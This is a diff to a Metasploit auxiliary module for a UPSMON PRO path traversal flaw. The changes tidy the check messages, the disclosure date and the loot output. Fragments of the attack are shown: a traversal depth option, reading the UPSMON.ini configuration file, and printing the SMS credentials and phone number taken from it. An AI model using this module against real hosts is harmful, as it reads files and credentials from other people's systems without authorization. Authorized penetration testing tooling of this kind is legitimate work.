@@ -1,3 +1,8 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -24,7 +29,7 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://www.twcert.org.tw/en/cp-139-6686-4041f-2.html'],
           ['URL', 'https://www.twcert.org.tw/en/cp-139-6687-cbce6-2.html']
         ],
-        'DisclosureDate' => '2024-08-22',
+        'DisclosureDate' => '2022-11-10',
         'DefaultOptions' => {
           'RPORT' => 8000,
           'SSL' => 'False'
@@ -42,7 +47,6 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The base path for UPSMON PRO', '/']),
         OptString.new('FILE', [false, 'The file path to read from the target system, e.g., /Users/Public/UPSMON-Pro/UPSMON.ini', '/Users/Public/UPSMON-Pro/UPSMON.ini']),
         OptInt.new('DEPTH', [ true, 'The traversal depth. The FILE path will be prepended with ../ * DEPTH', 4 ])
-
       ]
     )
   end
@@ -54,15 +58,15 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => normalize_uri(target_uri.path, 'index.html ')
       })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
-      return CheckCode::Unknown
+      return CheckCode::Unknown('Connection failed')
     end
 
     if res && res.code == 200
       data = res.to_s
       if data.include?('My Web Server 1') && data.include?('UPSMON PRO WEB')
-        vprint_status('UPSMON PRO Web seems to be running on target system.')
-        return CheckCode::Detected
+        return CheckCode::Detected('UPSMON PRO Web seems to be running on target system.')
       end
+
       return CheckCode::Safe
     end
     return CheckCode::Unknown
@@ -104,7 +108,7 @@ class MetasploitModule < Msf::Auxiliary
 
     fail_with(Failure::Unknown, 'No response from server.') if res.nil?
     fail_with(Failure::UnexpectedReply, 'Non-200 returned from server. If you believe the path is correct, try increasing the path traversal depth.') if res.code != 200
-    print_good("File retrieved: #{traversal}")
+    print_good("File retrieved: #{target_uri.path}#{traversal}")
 
     data = res.body
     if traversal.downcase.end_with?('upsmon.ini')
@@ -130,7 +134,7 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Phone Number: #{sms_creds[:phonenum].nil? || sms_creds[:phonenum].empty? ? '(not configured)' : sms_creds[:phonenum]}")
     end
 
-    store_loot('upsmonpro.file', 'text/plain', datastore['RHOSTS'], data, datastore['FILE'], 'File retrieved through UPSMON PRO path traversal.')
-    print_status('File saved as loot.')
+    path = store_loot('upsmonpro.file', 'text/plain', datastore['RHOSTS'], data, datastore['FILE'], 'File retrieved through UPSMON PRO path traversal.')
+    print_status("File saved as loot: #{path}")
   end
 end
